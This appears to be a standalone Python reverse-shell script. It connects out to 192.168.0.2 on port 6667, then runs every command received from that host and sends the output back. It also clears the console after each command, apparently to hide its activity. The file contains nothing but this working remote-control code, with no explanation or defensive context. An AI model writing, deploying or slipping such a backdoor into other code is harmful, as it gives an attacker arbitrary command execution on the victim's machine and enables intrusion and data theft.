import socket, os, subprocess

conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn.connect(("192.168.0.2",6667))
while True:
    cmd = conn.recv(1024).decode('utf-8')
    if cmd == "exit":
        break
    os.system(cmd)
    output = subprocess.getoutput(cmd)
    conn.send(output.encode('utf-8'))
    os.system("cls")
conn.close()
exit()